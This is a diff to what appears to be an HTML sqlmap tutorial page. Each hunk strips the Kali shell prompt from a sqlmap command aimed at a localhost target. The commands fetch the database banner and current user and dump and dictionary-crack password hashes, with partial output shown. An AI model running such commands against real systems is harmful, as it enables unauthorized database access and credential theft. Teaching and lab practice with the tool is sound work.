@@ -58,7 +58,7 @@
       </p>
 
 <pre class="lang-bash default-code-style dark-mode-background">
-kali@kali:~$ python3 sqlmap.py -u http://127.0.0.1/ <mark>--banner</mark> --forms --batch --random-agent
+python3 sqlmap.py -u http://127.0.0.1/ <mark>--banner</mark> --forms --batch --random-agent
 
 [09:29:04] [INFO] fetched random HTTP User-Agent header value 
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.0 (.NET CLR 3.5.30729)'
@@ -114,7 +114,7 @@ back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
       </p>
 
 <pre class="lang-bash default-code-style dark-mode-background">
-kali@kali:~$ python3 sqlmap.py -u http://127.0.0.1/ <mark>--current-user</mark> --forms --batch --random-agent
+python3 sqlmap.py -u http://127.0.0.1/ <mark>--current-user</mark> --forms --batch --random-agent
 
 [09:47:02] [INFO] fetched random HTTP User-Agent header value 
            'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.6) Gecko/20100118 Gentoo Firefox/3.5.6' 
@@ -174,7 +174,7 @@ back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
       </p>
 
 <pre class="lang-bash default-code-style dark-mode-background">
-kali@kali:~$ python3 sqlmap.py -u http://127.0.0.1/ <mark>--passwords</mark> --forms --batch --random-agent
+python3 sqlmap.py -u http://127.0.0.1/ <mark>--passwords</mark> --forms --batch --random-agent
 
 [15:07:58] [INFO] starting dictionary-based cracking (mysql_passwd)
 [15:07:58] [INFO] starting 4 processes
